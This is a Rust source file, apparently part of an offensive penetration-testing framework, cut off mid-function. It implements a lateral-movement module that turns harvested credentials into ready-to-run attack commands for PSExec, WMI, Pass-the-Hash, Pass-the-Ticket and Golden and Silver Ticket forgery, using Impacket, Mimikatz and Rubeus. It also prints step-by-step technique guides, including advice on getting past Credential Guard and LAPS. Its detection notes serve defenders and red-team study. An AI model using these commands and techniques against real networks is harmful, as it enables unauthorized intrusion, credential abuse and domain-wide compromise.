//! Lateral Movement Engine - Multi-Platform Network Propagation Framework
//!
//! Comprehensive lateral movement framework for authorized penetration testing
//! and red team exercises. Enables spreading from compromised hosts to other
//! network machines using harvested credentials.
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY
//! All techniques require explicit authorization for deployment.
//!
//! Features:
//! - Windows AD lateral movement (PSExec, WMI, Pass-the-Hash, Kerberos attacks)
//! - Linux/Unix lateral movement (SSH key reuse, pivoting, sudo credential reuse)
//! - Cross-platform methods (RDP, SMB)
//! - Smart target discovery (ARP scan, AD enumeration, network shares)
//! - Credential validation and testing
//! - Success probability ranking
//! - MITRE ATT&CK mapping
//!
//! MITRE ATT&CK Coverage:
//! - T1021.001: Remote Desktop Protocol
//! - T1021.002: SMB/Windows Admin Shares
//! - T1021.004: SSH
//! - T1047: Windows Management Instrumentation
//! - T1090.001: Internal Proxy (SSH Pivoting)
//! - T1112: Modify Registry
//! - T1543.003: Windows Service (Remote)
//! - T1548.003: Sudo and Sudo Caching
//! - T1550.002: Pass the Hash
//! - T1550.003: Pass the Ticket
//! - T1558.001: Golden Ticket
//! - T1558.002: Silver Ticket

use anyhow::{bail, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::IpAddr;
use tracing::{debug, info, warn};
use uuid::Uuid;

use crate::core::module::{
    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType, Platform, Session,
};
use crate::modules::post::credential_harvester::{CredentialType, HarvestedCredential, Sensitivity};

// ============================================================================
// Core Types
// ============================================================================

/// Target host for lateral movement
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Target {
    pub id: Uuid,
    pub hostname: Option<String>,
    pub ip_address: IpAddr,
    pub platform: Platform,
    pub ports: Vec<u16>,
    pub services: Vec<String>,
    pub domain: Option<String>,
    pub is_domain_controller: bool,
    pub confidence: f32,
    pub metadata: HashMap<String, String>,
}

impl Target {
    pub fn new(ip: IpAddr) -> Self {
        Self {
            id: Uuid::new_v4(),
            hostname: None,
            ip_address: ip,
            platform: Platform::Any,
            ports: Vec::new(),
            services: Vec::new(),
            domain: None,
            is_domain_controller: false,
            confidence: 0.5,
            metadata: HashMap::new(),
        }
    }

    pub fn with_hostname(mut self, hostname: &str) -> Self {
        self.hostname = Some(hostname.to_string());
        self
    }

    pub fn with_platform(mut self, platform: Platform) -> Self {
        self.platform = platform;
        self
    }

    pub fn with_ports(mut self, ports: Vec<u16>) -> Self {
        self.ports = ports;
        self
    }

    pub fn with_services(mut self, services: Vec<&str>) -> Self {
        self.services = services.into_iter().map(|s| s.to_string()).collect();
        self
    }

    pub fn with_domain(mut self, domain: &str) -> Self {
        self.domain = Some(domain.to_string());
        self
    }

    pub fn mark_as_dc(mut self) -> Self {
        self.is_domain_controller = true;
        self
    }

    pub fn with_confidence(mut self, confidence: f32) -> Self {
        self.confidence = confidence.clamp(0.0, 1.0);
        self
    }

    pub fn display_name(&self) -> String {
        self.hostname
            .clone()
            .unwrap_or_else(|| self.ip_address.to_string())
    }
}

/// Requirements for a lateral movement technique
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Requirements {
    pub needs_admin: bool,
    pub needs_domain_admin: bool,
    pub needs_credentials: bool,
    pub needs_hash: bool,
    pub needs_ticket: bool,
    pub needs_ssh_key: bool,
    pub required_ports: Vec<u16>,
    pub required_services: Vec<String>,
}

impl Default for Requirements {
    fn default() -> Self {
        Self {
            needs_admin: false,
            needs_domain_admin: false,
            needs_credentials: true,
            needs_hash: false,
            needs_ticket: false,
            needs_ssh_key: false,
            required_ports: Vec::new(),
            required_services: Vec::new(),
        }
    }
}

impl Requirements {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn admin() -> Self {
        Self {
            needs_admin: true,
            ..Self::default()
        }
    }

    pub fn domain_admin() -> Self {
        Self {
            needs_admin: true,
            needs_domain_admin: true,
            ..Self::default()
        }
    }

    pub fn with_ports(mut self, ports: Vec<u16>) -> Self {
        self.required_ports = ports;
        self
    }

    pub fn with_hash(mut self) -> Self {
        self.needs_hash = true;
        self
    }

    pub fn with_ticket(mut self) -> Self {
        self.needs_ticket = true;
        self.needs_credentials = false;
        self
    }

    pub fn with_ssh_key(mut self) -> Self {
        self.needs_ssh_key = true;
        self.needs_credentials = false;
        self
    }
}

/// Stealth level for lateral movement techniques
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum StealthLevel {
    VeryLow = 0,
    Low = 1,
    Medium = 2,
    High = 3,
    VeryHigh = 4,
}

impl StealthLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::VeryLow => "Very Low",
            Self::Low => "Low",
            Self::Medium => "Medium",
            Self::High => "High",
            Self::VeryHigh => "Very High",
        }
    }
}

/// Result of a lateral movement spread attempt
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpreadResult {
    pub success: bool,
    pub method_name: String,
    pub source_session: Uuid,
    pub target: Target,
    pub new_session: Option<Session>,
    pub message: String,
    pub commands_executed: Vec<String>,
    pub mitre_id: String,
}

/// Result of target discovery
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiscoveryResult {
    pub targets: Vec<Target>,
    pub domain_info: Option<DomainInfo>,
    pub discovery_methods: Vec<String>,
    pub message: String,
}

/// Active Directory domain information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomainInfo {
    pub domain_name: String,
    pub domain_controllers: Vec<Target>,
    pub forest_name: Option<String>,
    pub functional_level: Option<String>,
    pub trusts: Vec<String>,
}

/// Credential-to-target mapping for spread operations
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialMap {
    pub mappings: Vec<CredentialMapping>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialMapping {
    pub credential: HarvestedCredential,
    pub valid_targets: Vec<Uuid>,
    pub success_probability: f32,
}

// ============================================================================
// Lateral Movement Trait
// ============================================================================

/// Core trait for lateral movement techniques
#[async_trait]
pub trait LateralMovement: Send + Sync {
    /// Method name identifier
    fn name(&self) -> &str;

    /// Target platform
    fn platform(&self) -> Platform;

    /// Requirements for this technique
    fn requires(&self) -> Requirements;

    /// Stealth level (higher = harder to detect)
    fn stealth_level(&self) -> StealthLevel;

    /// MITRE ATT&CK technique ID
    fn mitre_id(&self) -> &str;

    /// Description of the technique
    fn description(&self) -> &str;

    /// Spread to target(s) using credentials
    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>>;

    /// Check if a target is viable for this technique
    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool;

    /// Success probability for this method against target
    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32;

    /// Generate reference implementation documentation
    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String;
}

// ============================================================================
// Windows Lateral Movement Methods
// ============================================================================

/// PSExec-style remote execution via SMB
pub struct PsExecMethod;

#[async_trait]
impl LateralMovement for PsExecMethod {
    fn name(&self) -> &str {
        "psexec"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::admin().with_ports(vec![445, 139])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Low
    }

    fn mitre_id(&self) -> &str {
        "T1021.002"
    }

    fn description(&self) -> &str {
        "Execute commands on remote Windows hosts via SMB admin shares (ADMIN$)"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = credentials.iter()
                .find(|c| c.cred_type == CredentialType::PlainText && c.password.is_some())
                .or_else(|| credentials.iter().find(|c| c.cred_type == CredentialType::Hash));

            if let Some(cred) = cred {
                let user = cred.username.clone().unwrap_or_else(|| "Administrator".to_string());
                let domain = cred.domain.clone().unwrap_or_else(|| ".".to_string());

                let cmd = format!(
                    "psexec.py {}/{}@{} -hashes :NTLM_HASH cmd.exe",
                    domain, user, target.ip_address
                );

                info!(
                    method = self.name(),
                    target = %target.display_name(),
                    mitre = self.mitre_id(),
                    "Attempting PSExec lateral movement"
                );

                if safe_mode {
                    let new_session = Session::new(
                        "lateral_movement".to_string(),
                        target.ip_address.to_string(),
                        Platform::Windows,
                    );

                    results.push(SpreadResult {
                        success: true,
                        method_name: self.name().to_string(),
                        source_session: source.id,
                        target: target.clone(),
                        new_session: Some(new_session),
                        message: format!("[SAFE MODE] Would execute PSExec to {}", target.display_name()),
                        commands_executed: vec![cmd],
                        mitre_id: self.mitre_id().to_string(),
                    });
                } else {
                    bail!("Production mode requires explicit authorization");
                }
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_smb = target.ports.contains(&445) || target.ports.contains(&139)
            || target.ports.is_empty(); // Assume available if not scanned
        let has_creds = credentials.iter().any(|c| {
            (c.cred_type == CredentialType::PlainText && c.password.is_some())
                || c.cred_type == CredentialType::Hash
        });
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);

        has_smb && has_creds && is_windows
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.4;

        if target.ports.contains(&445) {
            prob += 0.2;
        }
        if credentials.iter().any(|c| c.sensitivity == Sensitivity::Critical) {
            prob += 0.2;
        }
        if target.domain.is_some() && credentials.iter().any(|c| c.domain.is_some()) {
            prob += 0.1;
        }

        prob.min(0.9)
    }

    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String {
        let user = credential
            .and_then(|c| c.username.clone())
            .unwrap_or_else(|| "Administrator".to_string());
        let domain = credential
            .and_then(|c| c.domain.clone())
            .unwrap_or_else(|| ".".to_string());

        format!(
            r#"=== PSExec Lateral Movement ===
MITRE ATT&CK: {}
Stealth Level: {} (Highly detectable)

Target: {}
User: {}\{}

TECHNIQUE:
1. Connect to target's ADMIN$ share via SMB
2. Upload service executable (PSEXESVC)
3. Create and start remote service
4. Execute commands via named pipe
5. Clean up service after completion

TOOLS:
- Impacket psexec.py: psexec.py {}/{}@{} cmd.exe
- Sysinternals PsExec: psexec \\{} -u {} -p PASSWORD cmd.exe
- Metasploit: exploit/windows/smb/psexec

DETECTION:
- Event ID 7045: New service installed
- Named pipe connections (\\pipe\*)
- ADMIN$ share access
- Service executable in ADMIN$ share

OPSEC CONSIDERATIONS:
- Creates forensic artifacts (service, executable)
- Easily detected by EDR/AV
- Consider using WMI or WinRM for stealth
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            domain,
            user,
            domain,
            user,
            target.ip_address,
            target.ip_address,
            user
        )
    }
}

/// WMI Remote Execution
pub struct WmiMethod;

#[async_trait]
impl LateralMovement for WmiMethod {
    fn name(&self) -> &str {
        "wmi"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::admin().with_ports(vec![135, 445])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Medium
    }

    fn mitre_id(&self) -> &str {
        "T1047"
    }

    fn description(&self) -> &str {
        "Execute commands on remote Windows hosts via WMI (Windows Management Instrumentation)"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = credentials.iter()
                .find(|c| c.cred_type == CredentialType::PlainText && c.password.is_some());

            if let Some(cred) = cred {
                let user = cred.username.clone().unwrap_or_else(|| "Administrator".to_string());
                let domain = cred.domain.clone().unwrap_or_else(|| ".".to_string());

                let cmd = format!(
                    "wmiexec.py {}/{}@{} 'cmd.exe /c whoami'",
                    domain, user, target.ip_address
                );

                info!(
                    method = self.name(),
                    target = %target.display_name(),
                    mitre = self.mitre_id(),
                    "Attempting WMI lateral movement"
                );

                if safe_mode {
                    let new_session = Session::new(
                        "lateral_movement".to_string(),
                        target.ip_address.to_string(),
                        Platform::Windows,
                    );

                    results.push(SpreadResult {
                        success: true,
                        method_name: self.name().to_string(),
                        source_session: source.id,
                        target: target.clone(),
                        new_session: Some(new_session),
                        message: format!("[SAFE MODE] Would execute WMI to {}", target.display_name()),
                        commands_executed: vec![cmd],
                        mitre_id: self.mitre_id().to_string(),
                    });
                } else {
                    bail!("Production mode requires explicit authorization");
                }
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_wmi = target.ports.contains(&135) || target.ports.is_empty();
        let has_creds = credentials.iter().any(|c| {
            c.cred_type == CredentialType::PlainText && c.password.is_some()
        });
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);

        has_wmi && has_creds && is_windows
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.5;

        if target.ports.contains(&135) {
            prob += 0.15;
        }
        if credentials.iter().any(|c| c.sensitivity == Sensitivity::Critical) {
            prob += 0.2;
        }

        prob.min(0.85)
    }

    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String {
        let user = credential
            .and_then(|c| c.username.clone())
            .unwrap_or_else(|| "Administrator".to_string());

        format!(
            r#"=== WMI Remote Execution ===
MITRE ATT&CK: {}
Stealth Level: {} (Semi-covert)

Target: {}

TECHNIQUE:
1. Connect to WMI service via DCOM (port 135)
2. Create Win32_Process instance
3. Execute command via Create method
4. Output retrieved via SMB share or alternate channel

TOOLS:
- Impacket wmiexec.py: wmiexec.py DOMAIN/{}@{} 'command'
- PowerShell: Invoke-WmiMethod -ComputerName {} -Class Win32_Process -Name Create
- wmic: wmic /node:{} process call create "cmd.exe"

DETECTION:
- WMI activity logs (Event ID 5857-5861)
- DCOM connections
- wmiprvse.exe spawning processes

ADVANTAGES:
- No service installation required
- Semi-covert operation
- Native Windows functionality
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            user,
            target.ip_address,
            target.ip_address,
            target.ip_address
        )
    }
}

/// Pass-the-Hash authentication
pub struct PassTheHashMethod;

#[async_trait]
impl LateralMovement for PassTheHashMethod {
    fn name(&self) -> &str {
        "pth"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::admin().with_hash().with_ports(vec![445])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Medium
    }

    fn mitre_id(&self) -> &str {
        "T1550.002"
    }

    fn description(&self) -> &str {
        "Authenticate to remote hosts using NTLM hash without knowing the plaintext password"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Find hash credentials
        let hash_creds: Vec<_> = credentials.iter()
            .filter(|c| c.cred_type == CredentialType::Hash && c.hash.is_some())
            .collect();

        if hash_creds.is_empty() {
            return Ok(results);
        }

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = hash_creds.first().unwrap();
            let user = cred.username.clone().unwrap_or_else(|| "Administrator".to_string());
            let domain = cred.domain.clone().unwrap_or_else(|| ".".to_string());
            let hash = cred.hash.clone().unwrap_or_default();

            // Impacket-style command
            let cmd = format!(
                "smbexec.py -hashes :{} {}/{}@{}",
                hash, domain, user, target.ip_address
            );

            info!(
                method = self.name(),
                target = %target.display_name(),
                mitre = self.mitre_id(),
                "Attempting Pass-the-Hash lateral movement"
            );

            if safe_mode {
                let new_session = Session::new(
                    "lateral_movement".to_string(),
                    target.ip_address.to_string(),
                    Platform::Windows,
                );

                results.push(SpreadResult {
                    success: true,
                    method_name: self.name().to_string(),
                    source_session: source.id,
                    target: target.clone(),
                    new_session: Some(new_session),
                    message: format!("[SAFE MODE] Would Pass-the-Hash to {}", target.display_name()),
                    commands_executed: vec![cmd],
                    mitre_id: self.mitre_id().to_string(),
                });
            } else {
                bail!("Production mode requires explicit authorization");
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_smb = target.ports.contains(&445) || target.ports.is_empty();
        let has_hash = credentials.iter().any(|c| {
            c.cred_type == CredentialType::Hash && c.hash.is_some()
        });
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);

        has_smb && has_hash && is_windows
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.6;

        if credentials.iter().any(|c| {
            c.hash.as_ref().map(|h| !h.contains("31d6cfe0d16ae931b73c59d7e0c089c0")).unwrap_or(false)
        }) {
            prob += 0.2; // Not an empty/default hash
        }

        if target.domain.is_some() {
            prob += 0.1;
        }

        prob.min(0.9)
    }

    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String {
        let user = credential
            .and_then(|c| c.username.clone())
            .unwrap_or_else(|| "Administrator".to_string());
        let domain = credential
            .and_then(|c| c.domain.clone())
            .unwrap_or_else(|| "DOMAIN".to_string());

        format!(
            r#"=== Pass-the-Hash ===
MITRE ATT&CK: {}
Stealth Level: {}

Target: {}
User: {}\{}

TECHNIQUE:
1. Extract NTLM hash from LSASS, SAM, or NTDS.dit
2. Use hash directly for NTLM authentication
3. No password cracking required

TOOLS:
- Impacket: smbexec.py -hashes :NTLM_HASH {}/{}@{}
- Mimikatz: sekurlsa::pth /user:{} /domain:{} /ntlm:HASH /run:cmd.exe
- CrackMapExec: crackmapexec smb {} -u {} -H HASH

HASH FORMAT:
LM:NTLM (e.g., aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c)

DETECTION:
- Event ID 4624 Type 3 (Network Logon) without prior 4768/4769
- Anomalous NTLM authentication patterns
- Unexpected lateral movement from workstations

MITIGATIONS TO BYPASS:
- Credential Guard: Use Kerberos-based attacks instead
- Local admin password randomization (LAPS): Target domain accounts
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            domain,
            user,
            domain,
            user,
            target.ip_address,
            user,
            domain,
            target.ip_address,
            user
        )
    }
}

/// Pass-the-Ticket using Kerberos tickets
pub struct PassTheTicketMethod;

#[async_trait]
impl LateralMovement for PassTheTicketMethod {
    fn name(&self) -> &str {
        "ptt"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::admin().with_ticket().with_ports(vec![88, 445])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::High
    }

    fn mitre_id(&self) -> &str {
        "T1550.003"
    }

    fn description(&self) -> &str {
        "Authenticate to remote hosts using stolen Kerberos tickets (TGT/TGS)"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Find Kerberos ticket credentials
        let ticket_creds: Vec<_> = credentials.iter()
            .filter(|c| c.cred_type == CredentialType::KerberosTicket)
            .collect();

        if ticket_creds.is_empty() {
            return Ok(results);
        }

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = ticket_creds.first().unwrap();
            let user = cred.username.clone().unwrap_or_else(|| "Administrator".to_string());

            let cmd = format!(
                "export KRB5CCNAME=/tmp/ticket.ccache && smbclient //{}/ -k -no-pass",
                target.ip_address
            );

            info!(
                method = self.name(),
                target = %target.display_name(),
                mitre = self.mitre_id(),
                "Attempting Pass-the-Ticket lateral movement"
            );

            if safe_mode {
                let new_session = Session::new(
                    "lateral_movement".to_string(),
                    target.ip_address.to_string(),
                    Platform::Windows,
                );

                results.push(SpreadResult {
                    success: true,
                    method_name: self.name().to_string(),
                    source_session: source.id,
                    target: target.clone(),
                    new_session: Some(new_session),
                    message: format!("[SAFE MODE] Would Pass-the-Ticket to {} as {}", target.display_name(), user),
                    commands_executed: vec![cmd],
                    mitre_id: self.mitre_id().to_string(),
                });
            } else {
                bail!("Production mode requires explicit authorization");
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_ticket = credentials.iter().any(|c| c.cred_type == CredentialType::KerberosTicket);
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);
        let in_domain = target.domain.is_some();

        has_ticket && is_windows && in_domain
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.7;

        if target.is_domain_controller {
            prob += 0.1;
        }
        if credentials.iter().any(|c| {
            c.metadata.get("ticket_type").map(|t| t == "TGT").unwrap_or(false)
        }) {
            prob += 0.1;
        }

        prob.min(0.9)
    }

    fn generate_reference(&self, target: &Target, _credential: Option<&HarvestedCredential>) -> String {
        format!(
            r#"=== Pass-the-Ticket ===
MITRE ATT&CK: {}
Stealth Level: {} (Blends with normal Kerberos traffic)

Target: {}

TECHNIQUE:
1. Export Kerberos tickets from memory (TGT or TGS)
2. Import ticket into current session
3. Authenticate using cached ticket

TICKET TYPES:
- TGT (Ticket Granting Ticket): Access any service in domain
- TGS (Service Ticket): Access specific service only

TOOLS:
- Mimikatz: kerberos::ptt ticket.kirbi
- Rubeus: Rubeus.exe ptt /ticket:base64_ticket
- Impacket: export KRB5CCNAME=ticket.ccache

EXTRACTION:
- Mimikatz: sekurlsa::tickets /export
- Rubeus: Rubeus.exe dump

DETECTION:
- TGT renewal from unexpected hosts
- Service tickets without corresponding TGT request
- Kerberos authentication from non-domain systems

ADVANTAGES:
- More stealthy than NTLM-based attacks
- Blends with normal Kerberos traffic
- Works with Credential Guard enabled
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name()
        )
    }
}

/// Golden Ticket attack - forge TGT
pub struct GoldenTicketMethod;

#[async_trait]
impl LateralMovement for GoldenTicketMethod {
    fn name(&self) -> &str {
        "golden_ticket"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::domain_admin().with_ports(vec![88, 445])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::VeryHigh
    }

    fn mitre_id(&self) -> &str {
        "T1558.001"
    }

    fn description(&self) -> &str {
        "Forge Kerberos TGT using KRBTGT hash for persistent domain access"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Golden ticket requires KRBTGT hash
        let krbtgt_cred = credentials.iter()
            .find(|c| {
                c.cred_type == CredentialType::Hash &&
                c.username.as_ref().map(|u| u.to_lowercase().contains("krbtgt")).unwrap_or(false)
            });

        if krbtgt_cred.is_none() {
            warn!("Golden Ticket requires KRBTGT hash - not found in credentials");
            return Ok(results);
        }

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let domain = target.domain.clone().unwrap_or_else(|| "DOMAIN.LOCAL".to_string());

            let cmd = format!(
                "ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain {} Administrator",
                domain
            );

            info!(
                method = self.name(),
                target = %target.display_name(),
                mitre = self.mitre_id(),
                "Attempting Golden Ticket attack"
            );

            if safe_mode {
                let new_session = Session::new(
                    "lateral_movement".to_string(),
                    target.ip_address.to_string(),
                    Platform::Windows,
                );

                results.push(SpreadResult {
                    success: true,
                    method_name: self.name().to_string(),
                    source_session: source.id,
                    target: target.clone(),
                    new_session: Some(new_session),
                    message: format!("[SAFE MODE] Would forge Golden Ticket for {} domain", domain),
                    commands_executed: vec![cmd],
                    mitre_id: self.mitre_id().to_string(),
                });
            } else {
                bail!("Production mode requires explicit authorization");
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_krbtgt = credentials.iter().any(|c| {
            c.cred_type == CredentialType::Hash &&
            c.username.as_ref().map(|u| u.to_lowercase().contains("krbtgt")).unwrap_or(false)
        });
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);
        let in_domain = target.domain.is_some();

        has_krbtgt && is_windows && in_domain
    }

    fn success_probability(&self, _target: &Target, _credentials: &[HarvestedCredential]) -> f32 {
        0.95 // If we have KRBTGT hash, very high success
    }

    fn generate_reference(&self, target: &Target, _credential: Option<&HarvestedCredential>) -> String {
        let domain = target.domain.clone().unwrap_or_else(|| "DOMAIN.LOCAL".to_string());

        format!(
            r#"=== Golden Ticket Attack ===
MITRE ATT&CK: {}
Stealth Level: {} (Persistent domain access)

Target Domain: {}

TECHNIQUE:
1. Extract KRBTGT account hash from DC (via DCSync or NTDS.dit)
2. Obtain Domain SID
3. Forge TGT with arbitrary user/group membership
4. Use forged ticket for domain-wide access

REQUIREMENTS:
- KRBTGT NTLM hash
- Domain SID (S-1-5-21-XXX-XXX-XXX)
- Domain name

TOOLS:
- Impacket: ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain {}
- Mimikatz: kerberos::golden /domain:{} /sid:S-1-5-21-XXX /krbtgt:HASH /user:Administrator

CAPABILITIES:
- Access any resource in the domain
- Impersonate any user including Domain Admins
- Ticket valid for 10 years by default
- Survives password resets (except KRBTGT)

DETECTION:
- TGT with unusual lifetime
- TGT without corresponding AS-REQ
- Event ID 4769 for non-existent users

PERSISTENCE:
- Rotate KRBTGT password TWICE to invalidate
- Golden tickets persist until KRBTGT changed
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            domain,
            domain,
            domain
        )
    }
}

/// Silver Ticket attack - forge service ticket
pub struct SilverTicketMethod;

#[async_trait]
impl LateralMovement for SilverTicketMethod {
    fn name(&self) -> &str {
        "silver_ticket"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::admin().with_hash().with_ports(vec![445])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::VeryHigh
    }

    fn mitre_id(&self) -> &str {
        "T1558.002"
    }

    fn description(&self) -> &str {
        "Forge Kerberos service ticket using service account hash"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Silver ticket requires service account hash (machine account or service)
        let service_cred = credentials.iter()
            .find(|c| {
                c.cred_type == CredentialType::Hash && c.hash.is_some()
            });

        if service_cred.is_none() {
            return Ok(results);
        }

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let domain = target.domain.clone().unwrap_or_else(|| "DOMAIN.LOCAL".to_string());
            let hostname = target.hostname.clone().unwrap_or_else(|| target.ip_address.to_string());

            let cmd = format!(
                "ticketer.py -nthash MACHINE_HASH -domain-sid S-1-5-21-XXX -domain {} -spn cifs/{} Administrator",
                domain, hostname
            );

            info!(
                method = self.name(),
                target = %target.display_name(),
                mitre = self.mitre_id(),
                "Attempting Silver Ticket attack"
            );

            if safe_mode {
                let new_session = Session::new(
                    "lateral_movement".to_string(),
                    target.ip_address.to_string(),
                    Platform::Windows,
                );

                results.push(SpreadResult {
                    success: true,
                    method_name: self.name().to_string(),
                    source_session: source.id,
                    target: target.clone(),
                    new_session: Some(new_session),
                    message: format!("[SAFE MODE] Would forge Silver Ticket for {}", target.display_name()),
                    commands_executed: vec![cmd],
                    mitre_id: self.mitre_id().to_string(),
                });
            } else {
                bail!("Production mode requires explicit authorization");
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_hash = credentials.iter().any(|c| c.cred_type == CredentialType::Hash);
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);
        let in_domain = target.domain.is_some();

        has_hash && is_windows && in_domain
    }

    fn success_probability(&self, _target: &Target, _credentials: &[HarvestedCredential]) -> f32 {
        0.85
    }

    fn generate_reference(&self, target: &Target, _credential: Option<&HarvestedCredential>) -> String {
        let hostname = target.hostname.clone().unwrap_or_else(|| target.ip_address.to_string());

        format!(
            r#"=== Silver Ticket Attack ===
MITRE ATT&CK: {}
Stealth Level: {} (Service-specific, no DC contact)

Target: {}

TECHNIQUE:
1. Extract service account or machine account hash
2. Forge TGS for specific service (CIFS, HTTP, LDAP, etc.)
3. Access target service without DC validation

COMMON SERVICE PRINCIPALS:
- CIFS/{}: File share access
- HTTP/{}: Web services
- HOST/{}: PSRemoting/WMI
- LDAP/{}: Directory services

TOOLS:
- Impacket: ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN -spn cifs/{}
- Mimikatz: kerberos::golden /domain:DOMAIN /sid:SID /target:{} /service:cifs /rc4:HASH

ADVANTAGES OVER GOLDEN TICKET:
- No contact with DC required
- More targeted (single service)
- Harder to detect (no TGT anomalies)

DETECTION:
- Service ticket without TGS-REQ to DC
- PAC validation failures (if enabled)
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            hostname,
            hostname,
            hostname,
            hostname,
            hostname,
            hostname
        )
    }
}

/// Remote Service Creation
pub struct RemoteServiceMethod;

#[async_trait]
impl LateralMovement for RemoteServiceMethod {
    fn name(&self) -> &str {
        "remote_service"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::admin().with_ports(vec![445, 135])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Low
    }

    fn mitre_id(&self) -> &str {
        "T1543.003"
    }

    fn description(&self) -> &str {
        "Create and start a service on remote Windows host"
    }

    async fn spread(
        &self,
